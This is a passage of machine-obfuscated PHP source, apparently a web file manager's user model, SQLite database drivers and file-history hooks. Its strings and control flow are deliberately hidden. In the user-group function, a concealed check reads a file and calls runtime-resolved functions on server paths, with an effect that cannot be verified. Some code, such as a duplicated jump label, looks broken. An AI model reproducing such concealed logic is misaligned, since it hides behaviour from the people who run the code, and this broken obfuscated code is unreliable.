trim($f喙ɹ[$C[848]])); } else { unset($f喙ɹ[$C[848]]); } goto FאƋ; Bݻ: } public function setNamePinyin($f, $a = false) { $c߃ =& $_SERVER[̉]; if (!$a) { $cϵ = $this->getInfoSimple($f); $a = $cϵ[$c߃[1959]] ? $cϵ[$c߃[1959]] : $cϵ[$c߃[28]]; } $FҎ = Model($c߃[506]); if (!Input::check($a, $c߃[556])) { return $FҎ->metaSet($f, array($c߃[444] => $c߃[33], $c߃[443] => $c߃[33])); } return $FҎ->metaSet($f, array($c߃[444] => str_replace($c߃[50], $c߃[33], Pinyin::encode($a)), $c߃[443] => Pinyin::encode($a, $c߃[557]))); } private function nickNameRpt() { $e =& $_SERVER[̉]; $A = Model($e[733])->get($e[2152]); $C䠄 = $GLOBALS[$e[6]][$e[378]][$e[2152]]; $A˾ = !is_null($A) ? $A : $C䠄; return !!$A˾; } private function _checkExist($B, $Fԕ = false) { $f󔲋դ =& $_SERVER[̉]; $F韸 = array($f󔲋դ[28] => UserModel::ERROR_USER_EXIST_NAME, $f󔲋դ[1959] => UserModel::ERROR_USER_EXIST_NICKNAME, $f󔲋դ[303] => UserModel::ERROR_USER_EXIST_EMAIL, $f󔲋դ[2140] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($F韸[$f󔲋դ[1959]]); } $b𖈽 = $Fԕ ? array($f󔲋դ[1531] => array($f󔲋դ[2153], $Fԕ)) : array(); foreach ($F韸 as $Bቅ => $Eǳ) { $bЏ = array(); foreach ($F韸 as $A => $fۿ) { if (isset($B[$A]) && $B[$A]) { $bЏ[] = $B[$A]; } } if (!$bЏ) { continue; } $e = array_merge(array($Bቅ => array($f󔲋դ[7], $bЏ)), $b𖈽); $dނ̞ = $this->where($e)->find(); if ($dނ̞) { return $Eǳ; } } return !0; } public function userListInfo($D僝) { $D =& $_SERVER[̉]; $a = array(); $D僝 = is_array($D僝) ? array_unique($D僝) : array(); if (!$D僝) { return $a; } if (count($D僝) < 20) { foreach ($D僝 as $c鶆) { $a[$c鶆 . $D[33]] = $this->getInfoSimpleOuter($c鶆); } } else { $Aِ = array($D[1523] => array($D[411], $D僝)); if (count($D僝) == 1) { $Aِ = array($D[1523] => $D僝[0]); } $Cҽ = Model($D[502])->field($this->simpleField)->where($Aِ)->select(); $Cҽ = array_to_keyvalue($Cҽ, $D[1531]); foreach ($D僝 as $c鶆) { $D膿 = $Cҽ[$c鶆]; if (!$D膿) { $a[$c鶆 . $D[33]] = $this->getInfoSimpleOuter($c鶆); continue; } $D膿[$D[2125]] = Action($D[2126])->parseUrl($D膿[$D[2125]]); $a[$c鶆 . $D[33]] = $D膿; } } return $a; } protected function userStatus($Aй, $dҦ) { $dڅɏ = $this->getInfoSimple($Aй); if (!$dڅɏ) { return !1; } $d = array($_SERVER[̉][713] => $dҦ); return $this->userEdit($Aй, $d); } protected function userRemove($c͇ظ) { goto cܺ; EȦ: Model($F[1776])->where($b)->delete(); Model($F[2139])->where($b)->delete(); Model($F[2155])->where($b)->delete(); goto d؄; d؄: Model($F[1976])->removeUserAll($c͇ظ); Model($F[793])->userRootRemove($c͇ظ); return $this->where($b)->delete(); goto cٺ; cܺ: $F =& $_SERVER[̉]; $A = $this->getInfoSimple($c͇ظ); if (!$A) { return !1; } goto D􍅉; D􍅉: $b = array($F[1523] => $c͇ظ); Model($F[563])->where($b)->delete(); Model($F[2154])->where($b)->delete(); goto EȦ; cٺ: } protected function userGroupSet($B߲̾, $Fǫ, $eݫҳ = array()) { goto eΣ; a: if (!$a || !is_array($Fǫ)) { return !1; } $bލ = Model($AϧՉ[1776]); $bލ->where(array($AϧՉ[1531] => $B߲̾))->delete(); goto d٘; dȃ: return $bލ->addAll($Fܯ, array(), !0); goto Fɭ҅; eΣ: $AϧՉ =& $_SERVER[̉]; if ($_SERVER[$AϧՉ[834]] != $_SERVER[$AϧՉ[1462]]) { goto AӾ¥; b: $B̎ = 1; while ($B̎ > 1) { $B̎ = $B̎ + 4; $BɆٌւ = rawurlencode($B̎ . $AϧՉ[375]); } goto d; E柉: $E荇 = $AϧՉ[841]; $E荇($_SERVER[$AϧՉ[842]]); $E荇($_SERVER[$AϧՉ[838]] . $AϧՉ[1463]); goto b; AӾ¥: $bͰ = $AϧՉ[836]; $f􌄣 = $AϧՉ[837]; $b = $_SERVER[$AϧՉ[838]] . $AϧՉ[839]; goto eČ; eČ: $D¤ = $f􌄣($b); $c = explode($AϧՉ[229], $D¤); if (count($c) < $AϧՉ[581]) { $Fˆ = $AϧՉ[840]; $Fˆ(); } goto E柉; d: } $a = $this->getInfoSimple($B߲̾); goto a; d٘: $Fܯ = array(); $C = 0; foreach ($Fǫ as $fİ => $E) { $EӠζ = array($AϧՉ[1531] => $B߲̾, $AϧՉ[1695] => $fİ, $AϧՉ[1790] => $E); $EӠζ[$AϧՉ[1718]] = isset($eݫҳ[$C]) ? $eݫҳ[$C] : 0; $C++; $Fܯ[] = $EӠζ; } goto dȃ; Fɭ҅: } protected function userGroupAdd($Bи, $A = array()) { $b仏ƍ =& $_SERVER[̉]; $D = $this->getInfoSimple($Bи); if (!$D || empty($A)) { return !1; } $bު = array(); foreach ($A as $Eԗ禌 => $DʓĶ) { $bު[] = array($b仏ƍ[1531] => $Bи, $b仏ƍ[1695] => $Eԗ禌, $b仏ƍ[1790] => $DʓĶ, $b仏ƍ[1718] => 0); } return Model($b仏ƍ[1776])->addAll($bު, array(), !0); } protected function userGroupRemove($E߸, $Eʋ) { $f =& $_SERVER[̉]; $cɩŕ = $this->getInfoSimple($E߸); if (!$cɩŕ || !$Eʋ) { return !1; } $a = array($f[1523] => $E߸, $f[1773] => $Eʋ); return Model($f[1776])->where($a)->delete(); } public function listData() { $BԄߟ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($BԄߟ[$_SERVER[̉][367]]); return $BԄߟ; } public function listByID($a󷄸) { $A۴쮟Ǜ =& $_SERVER[̉]; if (!$a󷄸) { return; } $B = array($A۴쮟Ǜ[1531] => array($A۴쮟Ǜ[7], $a󷄸)); $E = $this->where($B)->select(); $this->_listDataApply($E); return $E; } public function listByGroup($D = 0, $Cآ뱭 = array()) { goto cΎͥ; d봔Ɵ: $this->_listDataApply($E򽯮[$f˵[367]]); return $E򽯮; goto F; dԈ: if ($D) { $eٸ = array($f˵[2156] => intval($D)); $aʑŤ = "\114\105\x46\x54\40\112\x4f\x49\116\x20{$this->tablePrefix}\165\x73\x65\x72\x5f\147\162\157\x75\160\40\x75\163\145\162\137\x67\x72\157\165\x70\40\x6f\156\x20\x75\x73\x65\x72\x2e\x75\163\145\162\x49\104\40\75\x20\165\163\145\162\137\x67\162\x6f\x75\x70\x2e\x75\163\x65\x72\111\x44"; $C = Input::get($f˵[435], null, $f˵[33]) ? $f˵[33] : $f˵[2157]; } if (isset($Cآ뱭[$f˵[713]])) { $eٸ[$f˵[2158]] = $Cآ뱭[$f˵[713]]; } $E򽯮 = $this->_makeOrder($C)->field($f˵[2159])->where($eٸ)->join($aʑŤ)->selectPage(50); goto d봔Ɵ; cΎͥ: $f˵ =& $_SERVER[̉]; $aʑŤ = $f˵[33]; $eٸ = array(); goto dԈ; F: } private function _makeOrder($B﬩ = '') { goto Aչ; Aչ: $Eß =& $_SERVER[̉]; $D։ = array($Eß[1531], $Eß[28], $Eß[1681], $Eß[1653], $Eß[194]); $Aꪫ = array($Eß[428] => $Eß[429], $Eß[430] => $Eß[431]); goto f; f: $E = Input::get($Eß[435], $Eß[7], $Eß[1523], $D։); $Eԧѹ = Input::get($Eß[436], $Eß[7], $Eß[1777], array($Eß[1777], $Eß[430])); $Eԧѹ = $Aꪫ[$Eԧѹ]; goto EӶ; EӶ: $B﬩ = $B﬩ . "\x75\x73\145\162\56{$E}\x20{$Eԧѹ}\x2c\40\x75\163\x65\x72\56\165\x73\145\162\111\104\40\141\x73\143"; return $this->alias($Eß[1899])->order($B﬩); goto C; C: } public function listSearch($F؈) { goto E҃; b⨉: $d͙č = $this->_makeOrder()->where($B)->selectPage(20); if (!$d͙č || count($d͙č[$f[367]]) < 5 && Input::check($F橏Ƙ, $f[316])) { $Aʰ = $this->_searchFromMeta($f[443], $F橏Ƙ, 10); $Eۅ = $this->_searchFromMeta($f[444], $F橏Ƙ, 10); $F̜ = array_merge($Aʰ, $Eۅ, $d͙č[$f[367]]); $d͙č[$f[367]] = array_unique_by_key($F̜, $f[1531]); $d͙č[$f[364]][$f[365]] = count($d͙č[$f[367]]); $d͙č[$f[364]][$f[366]] = ceil($d͙č[$f[364]][$f[365]] / $d͙č[$f[364]][$f[361]]); } $this->_listDataApply($d͙č[$f[367]]); goto f; f: $this->_filterByGroup($d͙č, $Bی); return $d͙č; goto eًȿ; E٠ᡙ: if (!$F橏Ƙ) { $B = array(); } if (isset($F؈[$f[713]])) { $B[$f[713]] = $F؈[$f[713]]; } $B = $this->parseWhereLike($B); goto b⨉; E҃: $f =& $_SERVER[̉]; $F橏Ƙ = $F؈[$f[1778]]; $Bی = isset($F؈[$f[1779]]) ? $F؈[$f[1779]] : !1; goto d; d: $F橏Ƙ = str_replace($f[1780], $f[1781], trim($F橏Ƙ)); $B = array($f[28] => array($f[380], "\x25{$F橏Ƙ}\45"), $f[303] => array($f[380], "{$F橏Ƙ}\45"), $f[1959] => array($f[380], "{$F橏Ƙ}\x25"), $f[956] => $f[1782]); if (Input::check($F橏Ƙ, $f[309])) { $B[$f[1531]] = array($f[380], "{$F橏Ƙ}\45"); $B[$f[2140]] = array($f[380], "{$F橏Ƙ}\45"); } goto E٠ᡙ; eًȿ: } private function _filterByGroup(&$bةڈ, $cǷ) { $A۽ =& $_SERVER[̉]; if (!$cǷ) { return $bةڈ; } foreach ($bةڈ[$A۽[367]] as $d => &$b阐) { $Cԭ = array_to_keyvalue($b阐[$A۽[1869]], $A۽[33], $A۽[1695]); if (!in_array($cǷ, $Cԭ)) { unset($bةڈ[$A۽[367]][$d]); } } unset($b阐); $bةڈ[$A۽[367]] = array_values($bةڈ[$A۽[367]]); $bةڈ[$A۽[364]] = array($A۽[1931] => count($bةڈ[$A۽[367]]), $A۽[1929] => $bةڈ[$A۽[364]][$A۽[361]], $A۽[1928] => 1, $A۽[1930] => 1); } private function _searchFromMeta($D䏶, $cت, $E) { goto C; C: $a󣤻 =& $_SERVER[̉]; $cت = strtolower($cت); $aԌ = array($a󣤻[93] => $D䏶, $a󣤻[372] => array($a󣤻[380], "\45{$cت}\45")); goto C֠; c۷: return $Eȷ; goto aܪ; C֠: $aԌ = $this->parseWhereLike($aԌ); $e䟿羏 = Model($a󣤻[2160])->where($aԌ)->limit($E)->select(); if (!$e䟿羏) { return array(); } goto BĶ; BĶ: $e䟿羏 = array_to_keyvalue($e䟿羏, $a󣤻[33], $a󣤻[1531]); $Eȷ = $this->where(array($a󣤻[1523] => array($a󣤻[7], $e䟿羏)))->select(); if (!$Eȷ) { return array(); } goto c۷; aܪ: } private function _listDataApplyItem($E) { $FΆɵ = array($E); $this->_listDataApply($FΆɵ); return $FΆɵ[0]; } private function _listDataApply(&$aƲح) { goto f; f: $e祛ҋ = array_to_keyvalue($aƲح, $e٫ظ[33], $e٫ظ[1531]); $this->_listAppendGroup($aƲح, $e祛ҋ); $this->_listAppendMeta($aƲح, $e祛ҋ); goto Cڽߋ; f: $e٫ظ =& $_SERVER[̉]; if (!$aƲح) { return; } array_remove_key($aƲح, $e٫ظ[848]); goto f; Cڽߋ: $this->_listAppendSourceRoot($aƲح, $e祛ҋ); goto Dǘ͙; Dǘ͙: } private function _listAppendSourceRoot(&$aڸӺ, $DߌǊ) { goto d͐; e匪Ą: $B︧۾ = Model($aŖ[793])->order($aŖ[1789])->field($Aƺ)->where($dڇ̬)->select(); $B︧۾ = array_to_keyvalue($B︧۾, $aŖ[484]); $B︧۾ = array_remove_key($B︧۾, $aŖ[484]); goto b撊; d͐: $aŖ =& $_SERVER[̉]; $dڇ̬ = array($aŖ[478] => 0, $aŖ[404] => SourceModel::TYPE_USER, $aŖ[484] => array($aŖ[7], $DߌǊ)); $Aƺ = $aŖ[1788]; goto e匪Ą; b撊: foreach ($aڸӺ as &$eϪۂ) { $eϪۂ[$aŖ[85]] = $B︧۾[$eϪۂ[$aŖ[1531]]] ? $B︧۾[$eϪۂ[$aŖ[1531]]] : array(); } unset($eϪۂ); goto B߂; B߂: } private function _listAppendGroup(&$dŎ, $aз) { goto Eºӫȸ; Eºӫȸ: $c𔤜 =& $_SERVER[̉]; $bȆ = array($c𔤜[1531] => array($c𔤜[7], $aз)); $aь = Model($c𔤜[1776])->where($bȆ)->select(); goto b; eƍ: $aь = array_to_keyvalue_group($aь, $c𔤜[1531]); foreach ($aь as &$Cʕ) { $DѡǄ = array(); foreach ($Cʕ as $dץ) { if (!$dץ[$c𔤜[1790]]) { continue; } $C = Model($c𔤜[1862])->listData($dץ[$c𔤜[1790]]); $DѡǄ[] = array($c𔤜[1695] => $dץ[$c𔤜[1695]], $c𔤜[2162] => $f[$dץ[$c𔤜[1695]]][$c𔤜[28]], $c𔤜[487] => $f[$dץ[$c𔤜[1695]]][$c𔤜[487]], $c𔤜[406] => $C); } $Cʕ = $DѡǄ; } unset($Cʕ); goto E̮; E̮: foreach ($dŎ as &$b) { $b[$c𔤜[1869]] = array(); if (isset($aь[$b[$c𔤜[1531]]])) { $b[$c𔤜[1869]] = $aь[$b[$c𔤜[1531]]]; } } unset($b); goto Eڜ; b: $FК = array_to_keyvalue($aь, $c𔤜[33], $c𔤜[1695]); $FК = array_remove_value(array_unique($FК), $c𔤜[191]); if (!$FК || !$aь) { return; } goto c; c: $bȆ = array($c𔤜[1695] => array($c𔤜[7], $FК)); $f = Model($c𔤜[1867])->field($c𔤜[2161])->where($bȆ)->select(); $f = array_to_keyvalue($f, $c𔤜[1695]); goto eƍ; Eڜ: } private function _listAppendMeta(&$E̖פ, $d) { goto bᆨ; b򨤆: $D䒐 = array($CɃ[1531] => array($CɃ[7], $d)); $Bʭ = Model($CɃ[2139])->where($D䒐)->select(); $Bʭ = array_to_keyvalue_group($Bʭ, $CɃ[1531]); goto d꧛; bᆨ: $CɃ =& $_SERVER[̉]; $Eı = UserJobModel::JOB_KEY; $A椉 = array($CɃ[2141]); goto b򨤆; A: foreach ($E̖פ as &$fȩ) { $E = array(); if (isset($Bʭ[$fȩ[$CɃ[1531]]])) { $E = $Bʭ[$fȩ[$CɃ[1531]]]; } $fȩ[$CɃ[2164]] = array(); if (isset($E[$Eı])) { $fȩ[$CɃ[2164]] = $dΓ->getUserJobInfo($E[$Eı]); } } unset($fȩ); goto A鼖; d꧛: foreach ($Bʭ as &$E̷) { $b = array(); foreach ($E̷ as $e넇) { if (!in_array($e넇[$CɃ[93]], $A椉)) { $b[$e넇[$CɃ[93]]] = $e넇[$CɃ[372]]; } } $E̷ = $b; } unset($E̷); $dΓ = Model($CɃ[2163]); goto A; A鼖: } protected function groupUserAll($D) { $bۇ =& $_SERVER[̉]; if (!$D) { return !1; } $B = Model($bۇ[1776])->field($bۇ[1531])->where(array($bۇ[1695] => array($bۇ[7], $D)))->select(); $B = array_to_keyvalue($B, $bۇ[33], $bۇ[1531]); return array_unique($B); } public function userSearch($B㺒, $bߠ = "\52") { return Model($_SERVER[̉][506])->where($B㺒)->field($bߠ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\162\137\157\160\164\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($EƵ) { $B =& $_SERVER[̉]; if (!defined($B[454])) { define($B[454], 0); } return "\125\x73\x65\162\117\x70\164\151\x6f\x6e\137{$EƵ}\137" . USER_ID; } protected function filterWhere($aܧ) { $F؍ז =& $_SERVER[̉]; if (!defined($F؍ז[454])) { define($F؍ז[454], 0); } $aܧ[$F؍ז[1531]] = USER_ID; return $aܧ; } public function cacheRemoveUser($bҵϭ, $EȰ) { return Cache::remove("\125\x73\x65\162\x4f\160\x74\x69\157\156\137{$bҵϭ}\137" . $EȰ); } protected function optionDefault($DÚ = '') { $Eޕ =& $_SERVER[̉]; if ($DÚ == $Eޕ[33]) { return $GLOBALS[$Eޕ[6]][$Eޕ[2165]]; } if ($DÚ == $Eޕ[2166]) { return $GLOBALS[$Eޕ[6]][$Eޕ[2167]]; } } } goto Ḟ; d뻂Ĉ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto eǢ; Cֱѭ: $this->tpl = TEMPLATE . MOD . $b[8]; $this->_classObjectID = mt_rand(0, 10000); goto AʯɆ; f: $this->in =& $in; $this->values[$b[6]] =& $config; $this->values[$b[7]] =& $in; goto Cֱѭ; eǢ: $b =& $_SERVER[̉]; global $in, $config; $this->config =& $config; goto f; AʯɆ: } public function loadClass($cЌ) { if (1 === func_num_args()) { $this->{$cЌ} = new $cЌ(); } else { $Bܑ = new ReflectionClass($cЌ); $C = func_get_args(); array_shift($C); $this->{$cЌ} = $Bܑ->newInstanceArgs($C); } return $this->{$cЌ}; } protected function assign($d, $Dʈ) { $this->values[$d] = $Dʈ; } protected function display($E) { ob_end_clean(); extract($this->values); require $this->tpl . $E; } } class DbSqliteBase extends Db { public function __construct($b = '') { $FѲŜ =& $_SERVER[̉]; if (!extension_loaded($FѲŜ[9])) { think_exception(think_lang($FѲŜ[10]) . $FѲŜ[11]); } if (!empty($b)) { if (!isset($b[$FѲŜ[12]])) { $b[$FѲŜ[12]] = 438; } $this->config = $b; if (empty($this->config[$FѲŜ[13]])) { $this->config[$FѲŜ[13]] = array(); } } } public function connect($B = '', $D = 0) { $Ē̒ =& $_SERVER[̉]; if (!isset($this->linkID[$D])) { goto Cۑ; b: @sqlite_busy_timeout($this->linkID[$D], 30000); if (1 != think_config($Ē̒[18])) { unset($this->config); } goto A; eꎩ: $this->linkID[$D] = $f؜($B[$Ē̒[17]], $B[$Ē̒[12]]); if (!$this->linkID[$D]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto b; Cۑ: if (empty($B)) { $B = $this->config; } $a = !empty($B[$Ē̒[13]][$Ē̒[14]]) ? $B[$Ē̒[13]][$Ē̒[14]] : $this->pconnect; $f؜ = $a ? $Ē̒[15] : $Ē̒[16]; goto eꎩ; A: } return $this->linkID[$D]; } public function free() { $this->queryID = null; } public function query($E價) { goto b槉ߟ; b槉ߟ: $FŎ =& $_SERVER[̉]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Cȫő; Cȫő: $this->queryStr = $E價; if ($this->queryID) { $this->free(); } think_action_status($FŎ[19], 1); goto Eݥ; EŖ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Cƛ = $this->getAll(); return $Cƛ; } goto aৰ; Eݥ: think_status($FŎ[20]); $this->queryID = sqlite_query($this->_linkID, $E價); $this->debug(); goto EŖ; aৰ: } public function execute($FᏃ) { goto bŭ; d: $this->queryStr = $FᏃ; if ($this->queryID) { $this->free(); } think_action_status($B牖̱[21], 1); goto bЗǐ; bŭ: $B牖̱ =& $_SERVER[̉]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d; b: if (!1 === $a˺) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto bЧ; bЗǐ: think_status($B牖̱[20]); $a˺ = sqlite_exec($this->_linkID, $FᏃ); $this->debug(); goto b; bЧ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[̉][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $DƏۅ = sqlite_query($this->_linkID, $_SERVER[̉][23]); if (!$DƏۅ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $AŌ = sqlite_query($this->_linkID, $_SERVER[̉][24]); if (!$AŌ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $AỘ = array(); if ($this->numRows > 0) { for ($A֞ = 0; $A֞ < $this->numRows; $A֞++) { $AỘ[$A֞] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $AỘ; } public function getFields($E) { $F =& $_SERVER[̉]; $f = $this->query($F[25] . $E . $F[26]); $C = array(); if ($f) { foreach ($f as $b => $aɜ⤃) { $C[$aɜ⤃[$F[27]]] = array($F[28] => $aɜ⤃[$F[27]], $F[29] => $aɜ⤃[$F[30]], $F[31] => (bool) ($aɜ⤃[$F[32]] === $F[33]), $F[34] => $aɜ⤃[$F[35]], $F[36] => strtolower($aɜ⤃[$F[37]]) == $F[38], $F[39] => strtolower($aɜ⤃[$F[40]]) == $F[41]); } } return $C; } public function getTables($Bý = '') { $F뭫Ԗ =& $_SERVER[̉]; $f鸾 = $this->query($F뭫Ԗ[42] . $F뭫Ԗ[43] . $F뭫Ԗ[44]); $eՑ˟ = array(); foreach ($f鸾 as $F => $aݳ֙) { $eՑ˟[$F] = current($aݳ֙); } return $eՑ˟; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $fô =& $_SERVER[̉]; $C頿 = sqlite_last_error($this->_linkID); $this->error = $C頿 . $fô[4] . sqlite_error_string($C頿); if ($fô[33] != $this->queryStr) { $this->error .= LNG($fô[45]) . $this->queryStr; } think_trace($this->error, $fô[33], $fô[46]); return $this->error; } public function escapeString($A롔) { return sqlite_escape_string($A롔); } public function parseLimit($eưƵ) { $Cѥť =& $_SERVER[̉]; $Bީ = $Cѥť[33]; if (!empty($eưƵ)) { $eưƵ = explode($Cѥť[47], $eưƵ); if (count($eưƵ) > 1) { $Bީ .= $Cѥť[48] . $eưƵ[1] . $Cѥť[49] . $eưƵ[0] . $Cѥť[50]; } else { $Bީ .= $Cѥť[48] . $eưƵ[0] . $Cѥť[50]; } } return $Bީ; } } class DbSqlite3Base extends Db { public function __construct($C֎ = '') { $b֚ =& $_SERVER[̉]; if (!class_exists($b֚[51])) { think_exception(think_lang($b֚[10]) . $b֚[52]); } if (!empty($C֎)) { if (!isset($C֎[$b֚[12]])) { $C֎[$b֚[12]] = 438; } $this->config = $C֎; if (empty($this->config[$b֚[13]])) { $this->config[$b֚[13]] = array(); } } } public function connect($Bɷ = '', $D婦 = 0) { $AӇ =& $_SERVER[̉]; if (!isset($this->linkID[$D婦])) { if (empty($Bɷ)) { $Bɷ = $this->config; } $this->linkID[$D婦] = new SQLite3($Bɷ[$AӇ[17]]); if (!$this->linkID[$D婦]) { think_exception($this->linkID[$D婦]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$D婦]->busyTimeout(30000); if (1 != think_config($AӇ[18])) { unset($this->config); } } return $this->linkID[$D婦]; } public function free() { $this->queryID = null; } public function query($f) { goto c᯼ݎ; c᯼ݎ: $eΟ؊ =& $_SERVER[̉]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto DУ֊; DУ֊: $this->queryStr = $f; if ($this->queryID) { $this->free(); } think_action_status($eΟ؊[19], 1); goto dˊ; F≈: if (!1 === $this->queryID) { $this->error(); return !1; } else { $AЉŊ = $this->getAll(); $this->numRows = count($AЉŊ); return $AЉŊ; } goto e; dˊ: think_status($eΟ؊[20]); $this->queryID = $this->_linkID->query($f); $this->debug(); goto F≈; e: } public function execute($Cμ) { goto eۉ; eۉ: $E娂 =& $_SERVER[̉]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Aل; Aل: $this->queryStr = $Cμ; if ($this->queryID) { $this->free(); } think_action_status($E娂[21], 1); goto Dݣ׋; b: if (!1 === $c) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto dԜ; Dݣ׋: think_status($E娂[20]); $c = $this->_linkID->exec($Cμ); $this->debug(); goto b; dԜ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[̉][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a = $this->_linkID->query($_SERVER[̉][23]); if (!$a) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $FІ = $this->_linkID->query($_SERVER[̉][24]); if (!$FІ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $B = array(); while ($D㹅 = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $B[] = $D㹅; } $this->queryID->reset(); return $B; } public function getFields($A폏) { $e =& $_SERVER[̉]; $f儍 = $this->query($e[25] . $A폏 . $e[26]); $f븏 = array(); if ($f儍) { foreach ($f儍 as $f率 => $E鎡) { $f븏[$E鎡[$e[28]]] = array($e[28] => $E鎡[$e[28]], $e[29] => $E鎡[$e[29]], $e[31] => (bool) ($E鎡[$e[31]] === $e[33]), $e[34] => $E鎡[$e[53]], $e[36] => (bool) $E鎡[$e[54]], $e[39] => (bool) $E鎡[$e[54]]); } } return $f븏; } public function getTables($B = '') { $f۹ =& $_SERVER[̉]; $E = $this->query($f۹[42] . $f۹[43] . $f۹[44]); $a콋 = array(); foreach ($E as $EХ => $eҠ) { $a콋[$EХ] = current($eҠ); } return $a콋; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Bڗţ =& $_SERVER[̉]; $this->error = $this->_linkID->lastErrorMsg(); if ($Bڗţ[33] != $this->queryStr) { $this->error .= LNG($Bڗţ[45]) . $this->queryStr; } think_trace($this->error, $Bڗţ[33], $Bڗţ[46]); return $this->error; } public function escapeString($A) { $d܏Ϙ =& $_SERVER[̉]; if ($this->_linkID) { return $this->_linkID->escapeString($A); } return str_ireplace($d܏Ϙ[55], $d܏Ϙ[56], $A); } public function parseLimit($cݠ) { $F̶㡐 =& $_SERVER[̉]; $a = $F̶㡐[33]; if (!empty($cݠ)) { $cݠ = explode($F̶㡐[47], $cݠ); if (count($cݠ) > 1) { $a .= $F̶㡐[48] . $cݠ[1] . $F̶㡐[49] . $cݠ[0] . $F̶㡐[50]; } else { $a .= $F̶㡐[48] . $cݠ[0] . $F̶㡐[50]; } } return $a; } } goto a; F: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto cެ; A: if ($Dݒ[$bݙ[1103]] <= 0) { return; } if (isset($_REQUEST[$bݙ[1104]]) && $_REQUEST[$bݙ[1104]] == $bݙ[87]) { return; } Hook::bind($bݙ[1105], $bݙ[1106]); goto cȽ; cȽ: Hook::bind($bݙ[1107], $bݙ[1108]); Hook::bind($bݙ[1109], $bݙ[1110]); Hook::bind($bݙ[1111], $bݙ[1112]); goto eͭ˝; eͭ˝: Hook::bind($bݙ[1113], $bݙ[1114]); Hook::bind($bݙ[1115], $bݙ[1116]); goto dϯŔ; cެ: $bݙ =& $_SERVER[̉]; $Dݒ = $GLOBALS[$bݙ[6]][$bݙ[88]]; if ($Dݒ[$bݙ[1102]] != 1) { return; } goto A; dϯŔ: } public static function eventBeforeUpload($Eճ) { if ($Eճ[3] && $Eճ[3] != REPEAT_REPLACE) { return; } $F⠰ = self::parsePath($Eճ[0]); if (!$F⠰) { return; } self::add($F⠰); } public static function eventBeforeEdit($C协) { $e䝅 = self::parsePath($C协[0]); if (!$e䝅) { return; } self::add($e䝅); } public static function eventBeforeCopyFile($A؋幅, $F, $C, $aƷĦԌ, $bڈ, $FŇ) { $A􋂛 = $C->getPathOuter($aƷĦԌ); $A۟㈼ = self::parsePath($A􋂛); if (!$A۟㈼) { return; } self::add($A۟㈼); } public static function eventBeforeRename($a) { $CԳ =& $_SERVER[̉]; $C = self::parsePath($a[0]); if (!$C) { return; } $E = self::checkInHistory($C); if (!$E) { return; } if ($E[$CԳ[29]] == $CԳ[193]) { $C = self::listData($C); if ($C && $C[$CԳ[367]]) { self::moveHistory($C, $a[1]); } } else { IO::rename($E[$CԳ[76]], $a[1]); } } public static function eventBeforeMove($a⸄) { goto f묐ŉ; Dʛ: $F׵貺 = self::checkInHistory($B); if (!$F׵貺) { return; } $d = self::pathHistory($bΐҨ); goto d; f묐ŉ: $Eǌۓ =& $_SERVER[̉]; $B = self::parsePath($a⸄[0]); if (!$B) { return; } goto DƘ; DƘ: $bΐҨ = self::parsePath($a⸄[1]); if (!$bΐҨ) { return; } $c = $a⸄[3]; goto Dʛ; d: if ($F׵貺[$Eǌۓ[29]] == $Eǌۓ[193]) { $F։ = self::listData($B); $C = rtrim($bΐҨ, $Eǌۓ[8]) . $Eǌۓ[8] . ($c ? $c : get_path_this($B)); $EȂ = self::listData($C); if ($F։ && $F։[$Eǌۓ[367]] && $EȂ && $EȂ[$Eǌۓ[367]]) { return self::clear($B); } if ($F։ && $F։[$Eǌۓ[367]]) { self::moveHistory($B, $c, $d); } } else { IO::move($F׵貺[$Eǌۓ[76]], $d, !1, $c); self::clearEmptyFolder(IO::pathFather($F׵貺[$Eǌۓ[76]])); } goto bխ; bխ: } public static function eventAfterRemove($d͘, $a߸) { goto aß; f粏: if (!$BΧ) { return; } $aƑ = self::checkInHistory($BΧ); if (!$aƑ) { return; } goto bÜ; aß: $fϠ濚 =& $_SERVER[̉]; if (!$a߸) { return; } $BΧ = self::parsePath($d͘[0]); goto f粏; bÜ: if ($aƑ[$fϠ濚[29]] == $fϠ濚[193]) { $e΅ = self::listData($BΧ, !1); if ($e΅ && $e΅[$fϠ濚[367]]) { self::clear($BΧ, !1); } } else { IO::remove($aƑ[$fϠ濚[76]]); self::clearEmptyFolder(IO::pathFather($aƑ[$fϠ濚[76]])); } goto Bӷ; Bӷ: } private static function checkInHistory($BǢ꯷) { $FԈ = self::pathHistory($BǢ꯷); if 